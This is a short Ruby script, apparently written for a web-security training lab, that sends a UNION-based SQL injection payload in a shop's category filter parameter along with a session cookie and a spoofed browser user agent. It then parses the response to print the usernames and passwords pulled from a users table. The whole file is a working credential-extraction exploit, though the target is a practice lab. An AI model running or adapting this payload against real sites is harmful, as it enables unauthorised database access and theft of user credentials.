require 'http'
require 'nokogiri'

payload = "' UNION SELECT username,password FROM users-- -"

url = "https://0aec00f6039526e680a962e800ca00ed.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "2kp2O827XLjyOemThzw7bcERd4kBBoJX"
	)

resp = client.get url,:params => {:category => "Gifts#{payload}"}
resph = Nokogiri.parse resp.body.to_s

puts resph.search('tr').text
